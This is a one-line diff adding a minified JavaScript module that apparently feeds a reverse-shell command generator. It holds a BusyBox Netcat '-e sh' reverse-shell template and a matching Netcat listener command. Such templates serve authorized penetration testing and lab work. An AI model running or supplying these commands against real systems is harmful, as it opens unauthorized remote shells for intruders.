@@ -1,0 +1,1 @@
+const e=[{title:"BusyBox Netcat -e reverse shell",template:"busybox nc {ip} {port} -e sh",description:"Uses BusyBox's built-in Netcat with -e to launch a reverse shell."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
